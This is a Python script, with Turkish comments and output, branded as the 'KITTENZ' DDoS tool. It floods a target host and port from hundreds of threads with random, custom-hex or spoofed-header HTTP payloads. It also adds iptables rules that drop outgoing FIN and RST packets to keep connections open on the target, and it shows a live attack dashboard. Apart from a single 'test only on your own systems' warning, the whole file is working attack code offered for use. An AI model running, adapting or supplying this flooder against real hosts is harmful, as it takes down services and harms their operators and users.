#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
from time import sleep, time
from threading import Thread, Lock, active_count
from os import system, geteuid
import random
import string
import signal
import ssl
import argparse
import sys
import struct

# Renkli ve emojili çıktılar için
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

emoji = {
    "fire": "🔥",
    "rocket": "🚀",
    "skull": "💀",
    "warning": "⚠️",
    "success": "✅",
    "error": "❌",
    "info": "ℹ️",
    "target": "🎯",
    "network": "🌐",
    "stats": "📊",
    "timer": "⏱️"
}

example_text = f'''\n{Colors.BOLD}🗲 KITTENZ GELİŞMİŞ DDoS Aracı 🗲{Colors.END}

{Colors.YELLOW}📖 KULLANIM ÖRNEKLERİ:{Colors.END}
  python3 {sys.argv[0]} example.com/test.php -p 80 -http
  python3 {sys.argv[0]} example.com/hello/ -p 443 -ssl -http
  python3 {sys.argv[0]} example.com -p 80 -http 
  python3 {sys.argv[0]} example.com -p 21 -payload 68656c6c6f
  python3 {sys.argv[0]} example.com -p 22 -t 500 -time 60

{Colors.CYAN}📊 İSTATİSTİK AÇIKLAMALARI:{Colors.END}
  {emoji["network"]}  Bağlantılar - Hedefe yapılan TCP bağlantıları
  {emoji["rocket"]}  Gönderilen - Hedefe gönderilen payload sayısı
  {emoji["error"]}  Başarısız  - Başarısız bağlantı/gönderim sayısı
  {emoji["timer"]}  Süre       - Saldırının başlangıcından itibaren geçen süre
  {emoji["stats"]}  Hız        - Saniyedeki işlem sayısı

{Colors.RED}⚠️  UYARI: Sadece kendi sistemlerinizde test amaçlı kullanın!{Colors.END}
'''

parser = argparse.ArgumentParser(
    epilog=example_text, 
    formatter_class=argparse.RawTextHelpFormatter
)
parser._action_groups.pop()
required = parser.add_argument_group(f'{Colors.RED}🔰 ZORUNLU PARAMETRELER{Colors.END}')
optional = parser.add_argument_group(f'{Colors.YELLOW}🎛️  OPSİYONEL PARAMETRELER{Colors.END}')

required.add_argument('target', help='Hedef URL/IP adresi')
required.add_argument('-p', '--port', dest='port', type=int, required=True, 
                     help='Hedef port numarası')

optional.add_argument('-t', '--threads', dest='threads', type=int, default=500,
                     help=f'Thread sayısı (Varsayılan: {Colors.BOLD}500{Colors.END})')
optional.add_argument('-ssl', action='store_true', help='SSL/TLS kullan')
optional.add_argument('-http', action='store_true', 
                     help='HTTP headerları kullan (Özel payload yoksa)')
optional.add_argument('-payload', help='Özel payload (hex formatında)')
optional.add_argument('-time', '--duration', type=int, default=0,
                     help='Saldırı süresi (saniye)')
optional.add_argument('-v', '--verbose', action='store_true', 
                     help='Detaylı çıktı modu')

print(f"\n{Colors.BOLD}{Colors.PURPLE}🗲 KITTENZ GELİŞMİŞ DDoS Aracı Başlatılıyor... 🗲{Colors.END}\n")

args = parser.parse_args()

# Global istatistikler
stats = {
    'connected': 0,
    'payloads': 0,
    'failed': 0,
    'start_time': time()
}
stats_lock = Lock()

def update_stats(connected=0, payloads=0, failed=0):
    with stats_lock:
        stats['connected'] += connected
        stats['payloads'] += payloads
        stats['failed'] += failed

# Signal handler
stop = False
def signal_handler(signum, frame):
    global stop
    print(f"\n\n{Colors.YELLOW}{emoji['warning']} Saldırı durduruluyor...{Colors.END}")
    stop = True

signal.signal(signal.SIGINT, signal_handler)

# Root kontrolü
if geteuid() != 0:
    print(f"{Colors.RED}{emoji['error']} Bu aracı root olarak çalıştırmanız gerekiyor!{Colors.END}")
    sys.exit(1)

# Hedef URL ayıklama
target = args.target.replace('http://', '').replace('https://', '')
if '/' in target and args.http:
    path = target[target.find('/'):]
    target = target[:target.find('/')]
else:
    path = '/'

# Payload decode
custom_payload = b''
if args.payload:
    try:
        custom_payload = bytes.fromhex(args.payload)
        print(f"{Colors.GREEN}{emoji['success']} Özel payload kullanılıyor: {args.payload}{Colors.END}")
    except ValueError:
        print(f"{Colors.RED}{emoji['error']} Geçersiz hex payload!{Colors.END}")
        sys.exit(1)

# IPTables kuralları
target_ip = socket.gethostbyname(target)
print(f"{Colors.CYAN}{emoji['target']} Hedef: {target} ({target_ip}:{args.port}){Colors.END}")

try:
    system(f'iptables -A OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
    system(f'iptables -A OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags RST RST -j DROP 2>/dev/null')
    print(f"{Colors.GREEN}{emoji['success']} IPTables kuralları eklendi{Colors.END}")
except:
    print(f"{Colors.YELLOW}{emoji['warning']} IPTables kuralları eklenemedi{Colors.END}")

# Rastgele string generator
def random_string(size=None):
    if size is None:
        size = random.randint(5, 15)
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(size))

# HTTP payload generator
def generate_http_payload():
    methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Kittenz-Super-Bot/1.0'
    ]
    
    method = random.choice(methods)
    payload = f'{method} {path}?{random_string()}={random_string()} HTTP/1.1\r\n'
    payload += f'Host: {target}\r\n'
    payload += f'User-Agent: {random.choice(user_agents)}\r\n'
    payload += f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
    payload += f'Accept-Language: en-US,en;q=0.5\r\n'
    payload += f'Accept-Encoding: gzip, deflate\r\n'
    payload += f'Connection: keep-alive\r\n'
    payload += f'Cache-Control: no-cache\r\n'
    payload += f'X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n'
    
    if method == 'POST':
        payload += f'Content-Type: application/x-www-form-urlencoded\r\n'
        payload += f'Content-Length: {random.randint(10, 100)}\r\n\r\n'
        payload += f'{random_string()}={random_string()}'
    else:
        payload += '\r\n'
    
    return payload.encode()

# Saldırı thread'i
def attack_thread(thread_id):
    local_stats = {'connected': 0, 'payloads': 0, 'failed': 0}
    
    while not stop:
        # Süre kontrolü
        if args.duration > 0 and (time() - stats['start_time']) > args.duration:
            break
            
        try:
            # Socket oluştur
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            # Bağlan
            s.connect((target_ip, args.port))
            local_stats['connected'] += 1
            
            # SSL
            if args.ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=target)
            
            # Payload gönder
            if custom_payload:
                payload = custom_payload
            elif args.http:
                payload = generate_http_payload()
            else:
                payload = random_string().encode()
            
            s.send(payload)
            local_stats['payloads'] += 1
            
            # Keep-alive için kısa süre bekle
            sleep(0.01)
            s.close()
            
        except Exception as e:
            local_stats['failed'] += 1
            if args.verbose and local_stats['failed'] % 100 == 0:
                print(f"{Colors.YELLOW}Thread {thread_id} hata: {str(e)}{Colors.END}")
        
        # Her 100 işlemde bir istatistik güncelle
        if sum(local_stats.values()) % 100 == 0:
            update_stats(**local_stats)
            local_stats = {'connected': 0, 'payloads': 0, 'failed': 0}
    
    # Thread sonunda kalan istatistikleri gönder
    update_stats(**local_stats)

# İstatistik gösterici
def show_stats():
    last_time = time()
    last_connected = stats['connected']
    last_payloads = stats['payloads']
    
    while not stop:
        current_time = time()
        elapsed = current_time - last_time
        total_elapsed = current_time - stats['start_time']
        
        # Hız hesapla
        current_connected = stats['connected']
        current_payloads = stats['payloads']
        
        conn_speed = (current_connected - last_connected) / elapsed if elapsed > 0 else 0
        payload_speed = (current_payloads - last_payloads) / elapsed if elapsed > 0 else 0
        
        # Ekranı temizle ve istatistikleri göster
        system('clear')
        
        print(f"{Colors.BOLD}{Colors.PURPLE}🗲 KITTENZ AKTİF SALDIRI 🗲{Colors.END}")
        print(f"{Colors.CYAN}{'='*50}{Colors.END}")
        print(f"{emoji['target']}  {Colors.BOLD}Hedef:{Colors.END} {target}:{args.port}")
        print(f"{emoji['rocket']}  {Colors.BOLD}Thread:{Colors.END} {args.threads}")
        print(f"{emoji['timer']}  {Colors.BOLD}Süre:{Colors.END} {int(total_elapsed)}s")
        print(f"{Colors.CYAN}{'='*50}{Colors.END}")
        
        print(f"\n{emoji['network']}  {Colors.GREEN}Bağlantılar: {Colors.BOLD}{stats['connected']}{Colors.END}")
        print(f"{emoji['rocket']}  {Colors.BLUE}Gönderilen: {Colors.BOLD}{stats['payloads']}{Colors.END}")
        print(f"{emoji['error']}  {Colors.RED}Başarısız:  {Colors.BOLD}{stats['failed']}{Colors.END}")
        
        print(f"\n{emoji['stats']}  {Colors.YELLOW}Bağlantı Hızı: {Colors.BOLD}{conn_speed:.1f}/s{Colors.END}")
        print(f"{emoji['stats']}  {Colors.YELLOW}Payload Hızı: {Colors.BOLD}{payload_speed:.1f}/s{Colors.END}")
        
        print(f"\n{Colors.YELLOW}⏹️  Durdurmak için CTRL+C tuşlarına basın{Colors.END}")
        
        last_time = current_time
        last_connected = current_connected
        last_payloads = current_payloads
        
        sleep(1)

# Ana program
if __name__ == '__main__':
    print(f"{Colors.GREEN}{emoji['rocket']} Saldırı başlatılıyor...{Colors.END}")
    print(f"{Colors.CYAN}Threadler: {args.threads}{Colors.END}")
    print(f"{Colors.CYAN}Süre: {args.duration if args.duration > 0 else 'Sınırsız'}s{Colors.END}")
    
    # Thread'leri başlat
    threads = []
    for i in range(args.threads):
        t = Thread(target=attack_thread, args=(i+1,))
        t.daemon = True
        threads.append(t)
        t.start()
    
    # İstatistik thread'ini başlat
    stats_thread = Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Ana döngü
    try:
        while not stop:
            if args.duration > 0 and (time() - stats['start_time']) > args.duration:
                print(f"\n{Colors.YELLOW}{emoji['timer']} Saldırı süresi doldu!{Colors.END}")
                stop = True
            sleep(0.1)
            
            # Thread kontrolü
            if active_count() < 3:  # main + stats + 1 thread
                print(f"{Colors.RED}{emoji['error']} Tüm thread'ler durdu!{Colors.END}")
                break
    except KeyboardInterrupt:
        stop = True
    
    # Temizlik
    print(f"\n{Colors.YELLOW}{emoji['warning']} Temizlik yapılıyor...{Colors.END}")
    
    try:
        system(f'iptables -D OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
        system(f'iptables -D OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags RST RST -j DROP 2>/dev/null')
        print(f"{Colors.GREEN}{emoji['success']} IPTables kuralları temizlendi{Colors.END}")
    except:
        print(f"{Colors.YELLOW}{emoji['warning']} IPTables temizleme başarısız{Colors.END}")
    
    # Son istatistikler
    total_time = time() - stats['start_time']
    print(f"\n{Colors.BOLD}{Colors.PURPLE}🎯 SALDIRI TAMAMLANDI 🎯{Colors.END}")
    print(f"{Colors.CYAN}{'='*50}{Colors.END}")
    print(f"{emoji['network']}  Toplam Bağlantı: {Colors.GREEN}{stats['connected']}{Colors.END}")
    print(f"{emoji['rocket']}  Toplam Gönderim: {Colors.BLUE}{stats['payloads']}{Colors.END}")
    print(f"{emoji['error']}  Toplam Hata:     {Colors.RED}{stats['failed']}{Colors.END}")
    print(f"{emoji['timer']}  Toplam Süre:    {Colors.YELLOW}{int(total_time)}s{Colors.END}")
    print(f"{emoji['stats']}  Ortalama Hız:   {Colors.CYAN}{stats['payloads']/total_time:.1f} payload/s{Colors.END}")
    print(f"{Colors.CYAN}{'='*50}{Colors.END}")
